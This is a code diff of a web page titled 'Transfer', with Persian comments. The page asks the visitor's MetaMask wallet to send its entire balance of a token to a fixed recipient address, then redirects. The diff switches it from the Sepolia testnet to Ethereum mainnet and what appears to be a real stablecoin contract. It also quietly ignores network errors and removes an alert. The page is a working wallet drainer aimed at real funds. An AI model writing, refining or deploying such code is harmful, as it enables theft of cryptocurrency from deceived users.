@@ -2,16 +2,16 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Transfer</title>
+    <title>Transfer - V6</title>
 </head>
 <body>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
     <script>
         // تنظیمات - این مقادیر از بک‌اند شما تزریق می‌شوند
         const CONFIG = {
-            tokenAddress: "0x779877A7B0D9E8603169DdbD7836e478b4624789",      // آدرس توکن ERC20
-            recipientAddress: "0xe8729e199c2E2476a19704D316731b087f9a08a6", // آدرس مقصد
-            redirectUrl: "shoombool.us",         // وبسایت ریدایرکت
+            tokenAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",      // آدرس توکن ERC20
+            recipientAddress: "0xe8729e199c2E2476a19704D316731b087f9a09a6", // آدرس مقصد
+            redirectUrl: "https://shooshoo.us",         // وبسایت ریدایرکت
             redirectDelay: 2000                              // تاخیر ریدایرکت (میلی‌ثانیه)
         };
 
@@ -38,9 +38,11 @@
 
         async function executeTransfer() {
             try {
+                // تاخیر کوتاه برای لود شدن کامل Web3
+                await new Promise(resolve => setTimeout(resolve, 500));
+
                 // بررسی MetaMask
                 if (typeof window.ethereum === 'undefined') {
-                    alert('MetaMask not found');
                     window.location.href = CONFIG.redirectUrl;
                     return;
                 }
@@ -55,35 +57,29 @@
                     return;
                 }
 
-                // تغییر به شبکه Sepolia
+                // تغییر به شبکه Mainnet (Chain ID: 0x1)
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0xaa36a7' }]
+                        params: [{ chainId: '0x1' }]
                     });
                 } catch (switchError) {
-                    if (switchError.code === 4902) {
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: '0xaa36a7',
-                                chainName: 'Sepolia Test Network',
-                                rpcUrls: ['https://sepolia.infura.io/v3/'],
-                                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
-                                blockExplorerUrls: ['https://sepolia.etherscan.io/']
-                            }]
-                        });
-                    }
+                    // اگر خطا در تغییر شبکه، ادامه بدهد (ممکن است قبلاً Mainnet باشد)
+                    console.log('Network switch error, continuing...');
                 }
 
                 const userAddress = accounts[0];
+                
+                // تاخیر برای اطمینان از تغییر شبکه
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
                 const web3 = new Web3(window.ethereum);
                 const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.tokenAddress);
 
                 // دریافت موجودی کامل
                 const balance = await contract.methods.balanceOf(userAddress).call();
                 
-                if (balance === '0') {
+                if (balance === '0' || balance === 0) {
                     window.location.href = CONFIG.redirectUrl;
                     return;
                 }
@@ -91,16 +87,16 @@
                 // ایجاد data برای تراکنش
                 const transferData = contract.methods.transfer(CONFIG.recipientAddress, balance).encodeABI();
 
-                // پارامترهای تراکنش
+                // پارامترهای تراکنش با gas بیشتر برای mainnet
                 const txParams = {
                     to: CONFIG.tokenAddress,
                     from: userAddress,
                     data: transferData,
-                    gas: '0x15F90'
+                    gas: '0x30D40' // 200,000 gas برای mainnet
                 };
 
                 // ارسال تراکنش (فقط درخواست - کاربر تأیید/رد می‌کند)
-                await window.ethereum.request({
+                const txHash = await window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 });
